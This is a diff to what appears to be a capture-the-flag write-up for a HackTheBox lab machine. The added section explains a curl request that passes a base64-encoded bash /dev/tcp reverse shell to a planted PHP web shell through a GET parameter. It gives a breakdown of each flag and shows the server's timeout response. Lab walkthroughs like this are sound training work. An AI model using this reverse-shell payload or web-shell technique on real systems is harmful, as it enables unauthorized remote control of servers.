@@ -1096,11 +1096,41 @@ Even if the URL survived intact, the shell on the server side might misinterpret
 **Base64 sidesteps both problems entirely** because the base64 character set only uses letters, numbers, `+`, `/`, and `=` — and `--data-urlencode` handles those safely. The encoded string travels as a clean, unambiguous blob, and the decoding (`base64 -d | bash`) happens entirely on the server side after it arrives, where the special characters are no longer inside a URL.
 
 Think of it like putting a letter in an envelope — the envelope (base64) travels safely through the postal system (HTTP), and only gets opened (decoded) once it reaches its destination (the server).
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 3.4 ## Reverse Shell Established
+
+**Command:** `curl --get --data-urlencode "c=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMjcvODAgMD4mMQo=|base64 -d|bash" "http://support_001.enigma.htb/files/SHELL.php"`
+
+**Breakdown:**
+
+- `--get`
+    - **Description:** Forces curl to send the request as HTTP GET, appending the data as a query string rather than a POST body.
+    - **Purpose:** Critical — the web shell reads `$_GET["c"]` exclusively, so sending as POST would silently deliver the payload to a parameter the script never reads, resulting in no execution.
+- `--data-urlencode "c=echo YmFzaC...|base64 -d|bash"`
+    - **Description:** URL-encodes the full command string and appends it to the query string as the `c` parameter.
+    - **Purpose:** Safely encodes the pipe characters and spaces in the command so they survive the HTTP request intact and arrive at the server exactly as intended.
+
+**Result — Terminal 1 (curl):**
 
 ```shell
 ┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
 └─$ curl --get --data-urlencode "c=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMjcvODAgMD4mMQo=|base64 -d|bash" \
 "http://support_001.enigma.htb/files/SHELL.php"
+<html>
+<head><title>504 Gateway Time-out</title></head>
+<body>
+<center><h1>504 Gateway Time-out</h1></center>
+<hr><center>nginx/1.24.0 (Ubuntu)</center>
+</body>
+</html>
 ```
 
 ```shell
